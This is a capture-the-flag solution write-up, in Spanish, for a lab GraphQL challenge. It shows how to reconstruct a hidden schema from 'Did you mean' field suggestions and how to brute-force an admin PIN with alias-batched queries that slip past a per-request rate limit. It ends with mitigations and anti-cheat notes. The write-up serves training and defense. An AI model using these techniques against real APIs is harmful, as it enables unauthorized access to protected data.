# Solución — api-graphql-03 · Introspection Abyss

**Categoría:** api · **Dificultad:** insane · **Vuln central:** fuga de esquema GraphQL vía **field suggestions** con introspección desactivada + **alias batching abuse** para forzar el PIN del admin.

## Resumen

NebulaGraph expone `POST /graphql` con la introspección "desactivada"
(`__schema` / `__type` bloqueados por una regla de validación). El objetivo es
leer la nota privada del usuario `admin`, que es la flag:

```graphql
{ user(username:"admin"){ secretNote(pin: <PIN>) } }
```

`secretNote` requiere el `pin` (4 dígitos) del admin, **aleatorio por
instancia**. No se puede leer del código ni adivinar; hay que forzarlo.

## Cadena de vulnerabilidades

| # | Vuln | Mecánica |
|---|------|----------|
| 1 | Introspección desactivada | `__schema`/`__type` rechazados → no puedes volcar el esquema |
| 2 | **Field suggestions** | Las reglas de validación estándar siguen activas: un campo mal escrito devuelve `Did you mean 'X'?`, filtrando nombres reales |
| 3 | **Alias batching abuse** | El "rate limit" de `secretNote` es por-petición; metiendo miles de alias en UNA request se evade y se fuerza el PIN |

## Paso a paso

1. **Confirmar que la introspección está bloqueada**:
   ```graphql
   { __schema { types { name } } }
   # -> "GraphQL introspection has been disabled..."
   ```

2. **Filtrar el esquema con field suggestions** (sin introspección):
   ```graphql
   { usr(username:"admin"){ id } }
   # -> "Cannot query field 'usr' on type 'Query'. Did you mean 'user'?"

   { user(username:"admin"){ secretNot } }
   # -> "Cannot query field 'secretNot' on type 'User'. Did you mean 'secretNote'?"
   ```
   Iterando con prefijos/typos se reconstruye el esquema: existe `user(username)`,
   y `User.secretNote(pin: Int!)`.

3. **Descubrir que `secretNote` necesita un PIN**:
   ```graphql
   { user(username:"admin"){ secretNote } }
   # -> error: argument 'pin' of type 'Int!' is required
   ```

4. **Alias batching: forzar el PIN en pocas peticiones**. GraphQL permite muchos
   campos con alias en un solo documento; el límite anti-bruteforce solo cuenta
   por-request, así que se reparten 10000 PINs en unos pocos POST:
   ```graphql
   {
     user(username:"admin"){
       p0:    secretNote(pin: 0)
       p1:    secretNote(pin: 1)
       ...
       p9999: secretNote(pin: 9999)
     }
   }
   ```
   El alias cuyo valor empieza por `HL4{` revela a la vez el PIN y la flag.

Exploit automatizado: `solution/exploit.py http://<host>:8080`.

## Por qué es INSANE

- La introspección desactivada hace creer que el esquema es opaco; hay que
  saber que las **field suggestions** lo filtran igualmente y reconstruirlo a
  mano (campos, tipos, argumentos).
- El PIN es aleatorio por instancia: la única vía es el **alias batching**, que
  exige entender que GraphQL agrega muchos campos en una sola operación y que
  el rate limit ingenuo no lo cubre.

## Mitigaciones (didáctico)

- Desactivar también las field suggestions en producción (formatear errores de
  validación a un mensaje genérico; nunca devolver "Did you mean").
- Limitar **complejidad/profundidad** de la query y el **nº de campos/aliases**
  por documento (query cost analysis), no solo por petición HTTP.
- Para datos sensibles: autenticación/ autorización real, no un PIN; rate limit
  global por identidad y bloqueo tras N intentos fallidos (no por request).

## Nota anti-cheat

La flag (`note` del admin) es **dinámica y única por equipo** (HMAC del
flag-service, `ARCHITECTURE §4`), inyectada por env `FLAG`. El PIN del admin es
**aleatorio por instancia**, así que el método no transfiere la respuesta:
cada equipo debe forzar SU PIN contra SU instancia. Enviar la flag de otro
equipo dispara `cheat_flag_share` (`/whose-flag`). La fuga por suggestions, la
consulta al usuario admin y el alias batching emiten eventos SIEM
(`scan_detected` info/warn/alert) al collector.
